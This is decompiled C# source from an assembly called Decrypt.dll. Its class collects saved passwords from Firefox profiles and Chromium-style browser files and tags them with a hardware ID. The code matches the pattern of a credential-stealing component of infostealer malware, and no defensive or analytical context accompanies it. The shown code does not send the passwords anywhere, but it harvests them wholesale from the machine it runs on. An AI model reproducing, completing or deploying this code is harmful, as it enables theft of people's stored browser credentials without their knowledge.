// Decompiled with JetBrains decompiler
// Type: Decrypt.UniversavlDecryption
// Assembly: Decrypt, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2765FEAE-7833-475D-8D48-4374EDF0542D
// Assembly location: C:\Users\foxov\Desktop\build\bin\Debug\Decrypt.dll

using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;

namespace Decrypt
{
  public class UniversavlDecryption
  {
    public static object[] GetPasswords(params object[] prms)
    {
      List<Log> source = new List<Log>();
      foreach (Browser browser in UniversavlDecryption.GetBrowsers(prms))
      {
        Log log1 = new Log();
        log1.FileList = new List<BrowserLog>();
        string browserName = browser.BrowserName;
        log1.Browser = browserName;
        Log log2 = log1;
        foreach (string filePath in browser.FilePaths)
        {
          try
          {
            if (browser.BrowserName == "Mozilla")
            {
              log2.FileList.AddRange((IEnumerable<BrowserLog>) new FireFox(filePath).GetPasswords());
              break;
            }
            if (File.Exists(filePath))
              log2.FileList.AddRange((IEnumerable<BrowserLog>) new Chrome(filePath).GetPasswords());
          }
          catch
          {
          }
        }
        source.Add(log2);
      }
      return source.Select<Log, object>((Func<Log, object>) (x => (object) x)).ToArray<object>();
    }

    public static string GetHashValue()
    {
      return HWID.Generate();
    }

    public static List<string> MozillaFiles()
    {
      string basePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
      if (!Directory.Exists(basePath))
        return new List<string>();
      DirectoryInfo directoryInfo = new DirectoryInfo(basePath);
      if (directoryInfo != null)
        return ((IEnumerable<DirectoryInfo>) directoryInfo.GetDirectories()).Select<DirectoryInfo, string>((Func<DirectoryInfo, string>) (x => basePath + "\\" + x.ToString())).ToList<string>();
      return new List<string>();
    }

    public static List<Browser> GetBrowsers(object[] prms)
    {
      List<Browser> browserList1 = new List<Browser>();
      foreach (object prm in prms)
      {
        List<Browser> browserList2 = browserList1;
        Browser browser1 = new Browser();
        Browser browser2 = browser1;
        // ISSUE: reference to a compiler-generated field
        if (UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__1 == null)
        {
          // ISSUE: reference to a compiler-generated field
          UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__1 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof (string), typeof (UniversavlDecryption)));
        }
        // ISSUE: reference to a compiler-generated field
        Func<CallSite, object, string> target1 = UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__1.Target;
        // ISSUE: reference to a compiler-generated field
        CallSite<Func<CallSite, object, string>> p1 = UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__1;
        // ISSUE: reference to a compiler-generated field
        if (UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__0 == null)
        {
          // ISSUE: reference to a compiler-generated field
          UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "BrowserName", typeof (UniversavlDecryption), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[1]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object obj1 = UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__0.Target((CallSite) UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__0, prm);
        string str = target1((CallSite) p1, obj1);
        browser2.BrowserName = str;
        Browser browser3 = browser1;
        // ISSUE: reference to a compiler-generated field
        if (UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__3 == null)
        {
          // ISSUE: reference to a compiler-generated field
          UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__3 = CallSite<Func<CallSite, object, List<string>>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof (List<string>), typeof (UniversavlDecryption)));
        }
        // ISSUE: reference to a compiler-generated field
        Func<CallSite, object, List<string>> target2 = UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__3.Target;
        // ISSUE: reference to a compiler-generated field
        CallSite<Func<CallSite, object, List<string>>> p3 = UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__3;
        // ISSUE: reference to a compiler-generated field
        if (UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__2 == null)
        {
          // ISSUE: reference to a compiler-generated field
          UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__2 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "FilePaths", typeof (UniversavlDecryption), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[1]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object obj2 = UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__2.Target((CallSite) UniversavlDecryption.\u003C\u003Eo__3.\u003C\u003Ep__2, prm);
        List<string> stringList = target2((CallSite) p3, obj2);
        browser3.FilePaths = stringList;
        Browser browser4 = browser1;
        browserList2.Add(browser4);
      }
      return browserList1;
    }
  }
}
